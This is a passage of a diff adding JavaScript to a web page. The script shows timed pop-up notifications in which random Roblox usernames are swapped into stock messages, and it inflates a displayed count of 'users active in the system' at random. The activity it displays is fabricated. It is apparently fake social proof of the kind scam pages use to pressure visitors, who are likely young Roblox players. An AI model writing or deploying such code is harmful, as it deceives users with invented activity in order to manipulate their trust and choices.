+                    const randomUsername = robloxUsernames[Math.floor(Math.random() * robloxUsernames.length)];
+                    const baseNotification = notifications[Math.floor(Math.random() * notifications.length)];
+                    notification = {
+                        icon: baseNotification.icon,
+                        message: baseNotification.message.replace(/<strong>.*?<\/strong>/, `<strong>${randomUsername}</strong>`)
+                    };
+                } else {
+                    // Use exact predefined notification
+                    notification = notifications[Math.floor(Math.random() * notifications.length)];
+                }
+                
+                // Create notification element
+                const notificationEl = document.createElement('div');
+                notificationEl.className = 'notification';
+                notificationEl.innerHTML = `
+                    <div class="notification-content">
+                        <div class="notification-icon">${notification.icon}</div>
+                        <div class="notification-text">${notification.message}</div>
+                        <button class="notification-close" title="Dismiss">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    <div class="notification-progress">
+                        <div class="notification-progress-bar"></div>
+                    </div>
+                `;
+                
+                // Add to container
+                notificationContainer.appendChild(notificationEl);
+                
+                // Animate in
+                setTimeout(() => {
+                    notificationEl.classList.add('show');
+                    
+                    // Start progress bar animation
+                    const progressBar = notificationEl.querySelector('.notification-progress-bar');
+                    progressBar.style.transition = 'transform 6s linear';
+                    progressBar.style.transform = 'translateX(0)';
+                    
+                    // Auto-dismiss after 6 seconds
+                    const dismissTimeout = setTimeout(() => {
+                        dismissNotification(notificationEl);
+                    }, 6000);
+                    
+                    // Close button functionality
+                    const closeBtn = notificationEl.querySelector('.notification-close');
+                    closeBtn.addEventListener('click', () => {
+                        clearTimeout(dismissTimeout);
+                        dismissNotification(notificationEl);
+                    });
+                    
+                    // Increment online users randomly
+                    if (Math.random() > 0.7) {
+                        onlineUsers += Math.floor(Math.random() * 3) + 1;
+                        userCountElement.textContent = onlineUsers;
+                        
+                        // Occasionally show user count update notification
+                        if (Math.random() > 0.8) {
+                            setTimeout(() => {
+                                const updateNotification = document.createElement('div');
+                                updateNotification.className = 'notification';
+                                updateNotification.innerHTML = `
+                                    <div class="notification-content">
+                                        <div class="notification-icon">👥</div>
+                                        <div class="notification-text">Now <strong>${onlineUsers}</strong> users active in the system</div>
+                                        <button class="notification-close" title="Dismiss">
+                                            <i class="fas fa-times"></i>
+                                        </button>
+                                    </div>
+                                    <div class="notification-progress">
+                                        <div class="notification-progress-bar"></div>
+                                    </div>
+                                `;
+                                notificationContainer.appendChild(updateNotification);
+                                setTimeout(() => updateNotification.classList.add('show'), 10);
+                                
+                                const updateTimeout = setTimeout(() => dismissNotification(updateNotification), 5000);
+                                updateNotification.querySelector('.notification-close').addEventListener('click', () => {
+                                    clearTimeout(updateTimeout);
+                                    dismissNotification(updateNotification);
+                                });
+                            }, 2000);
+                        }
+                    }
+                }, 10);
+            }
+            
+            // Function to dismiss a notification
+            function dismissNotification(notificationEl) {
+                notificationEl.classList.remove('show');
+                notificationEl.classList.add('hide');
+                
+                setTimeout(() => {
+                    if (notificationEl.parentNode) {
+                        notificationEl.parentNode.removeChild(notificationEl);
+                        activeNotifications--;
+                    }
+                }, 500);
+            }
+            
+            // Start notification cycle
+            function startNotificationCycle() {
+                // Initial delay
+                setTimeout(() => {
+                    showNotification();
+                    
+                    // Set interval for new notifications (every 6-10 seconds)
+                    const interval = setInterval(() => {
+                        if (document.visibilityState === 'visible') {
+                            showNotification();
+                        }
+                    }, Math.random() * 4000 + 6000); // 6-10 seconds
+                    
+                    // Store interval for potential cleanup
+                    window.notificationInterval = interval;
+                }, 3000);
+            }
+            
+            // Start the notification system
+            startNotificationCycle();
+            
+            // Pause notifications when page is not visible
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'hidden') {
+                    // Clear existing interval
+                    if (window.notificationInterval) {
+                        clearInterval(window.notificationInterval);
+                    }
+                } else {
+                    // Restart notification cycle
+                    startNotificationCycle();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
